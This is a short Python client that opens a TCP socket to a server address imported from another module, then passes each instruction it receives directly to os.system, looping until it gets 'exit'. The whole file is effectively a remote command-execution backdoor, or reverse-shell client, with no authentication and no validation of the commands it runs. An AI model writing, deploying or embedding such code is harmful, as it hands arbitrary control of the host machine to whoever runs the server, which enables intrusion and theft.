import socket
import os
from remote_runfile import *
from colorama import *
init()

class SClient():
    def recvinstruction(self):
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect(server_addres)

        while True:
            instruction = client.recv(1024)
            instruction = instruction.decode()
            os.system(instruction)

            if instruction == "exit":
                print("{}- client terminated -{}".format(Style.BRIGHT+Fore.CYAN,Style.RESET_ALL))
                client.close()
                break

obj_client = SClient()
obj_client.recvinstruction()
